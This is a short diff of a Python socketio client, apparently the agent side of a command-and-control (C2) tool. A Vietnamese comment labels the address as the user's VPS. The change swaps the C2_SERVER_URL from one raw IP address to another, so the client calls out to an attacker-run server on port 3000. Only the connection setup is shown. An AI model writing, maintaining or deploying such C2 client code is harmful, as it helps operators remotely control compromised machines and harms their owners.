@@ -6,7 +6,7 @@ import os
 sio = socketio.Client()
 
 # IP VPS của bạn
-C2_SERVER_URL = 'http://170.64.229.9:3000'
+C2_SERVER_URL = 'http://172.93.163.140:3000 '
 
 @sio.event
 def connect():
